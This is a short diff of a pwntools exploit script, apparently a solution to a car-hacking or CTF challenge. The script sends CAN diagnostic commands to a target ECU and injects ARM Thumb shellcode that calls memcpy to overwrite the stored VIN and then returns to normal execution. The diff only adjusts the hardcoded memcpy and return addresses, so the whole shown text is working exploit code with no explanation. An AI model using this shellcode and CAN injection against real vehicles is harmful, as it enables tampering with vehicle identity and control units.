@@ -147,19 +147,19 @@ io.sendlineafter(b"> ",b"cansend 7e0#022003")
 io.sendlineafter(b"> ",b"cansend 7e0#0125")
 #store new vin
 write_data(0x70000090,bcm_vin)
-memcpy_addr = 0x6001159c
+memcpy_addr = 0x600115bc
 VIN_ADDR = 0x61000098
-_return = 0x60010960
+_return = 0x60010983
 context.endianness="little"
 shellcode = asm("""
-    movw r4,0x159c
+    movw r4,0x15bc
     movt r4,0x6001
     movw r0,0x0098
     movt r0,0x6100
     movw r1,0x0090
     movt r1,0x7000
     blx r4
-    movw r4,0x0961
+    movw r4,0x0983
     movt r4,0x6001
     bx r4
 """)
